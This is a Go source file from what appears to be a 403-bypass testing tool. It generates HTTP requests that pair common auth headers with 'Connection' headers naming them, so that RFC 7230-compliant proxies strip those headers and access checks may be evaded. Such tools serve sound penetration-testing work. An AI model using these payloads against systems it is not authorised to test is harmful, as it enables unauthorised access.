package payload

import (
	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// hopByHopHeaders are the well-known auth/credential headers unKover tests
// with the Connection-stripping trick. Kept verbatim per SPEC-unkover-gaps.md:
// the payload's value is the header pairing, not list expansion.
var hopByHopHeaders = []string{
	"Authorization",
	"Cookie",
	"X-Api-Key",
	"X-Auth-Token",
	"X-Access-Token",
}

/*
GenerateHeadersHopByHopPayloads generates unKover `hop_by_hop` parity
payloads: for each well-known auth header, a request pairing

	"<Header>: bypass" + "Connection: <Header>"

Proxies honoring RFC 7230 Connection list semantics strip the named header
before forwarding, which can remove an internal-only credential check or an
ACL-enforcing hop. The original path, query, scheme and host are preserved.
*/
func (pg *PayloadGenerator) GenerateHeadersHopByHopPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	rawURI := parsedURL.Path
	if parsedURL.Query != "" {
		rawURI += "?" + parsedURL.Query
	}

	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		RawURI:       rawURI,
		BypassModule: bypassModule,
	}

	for _, h := range hopByHopHeaders {
		job := baseJob
		job.Headers = []Headers{
			{Header: h, Value: "bypass"},
			{Header: "Connection", Value: h},
		}
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}
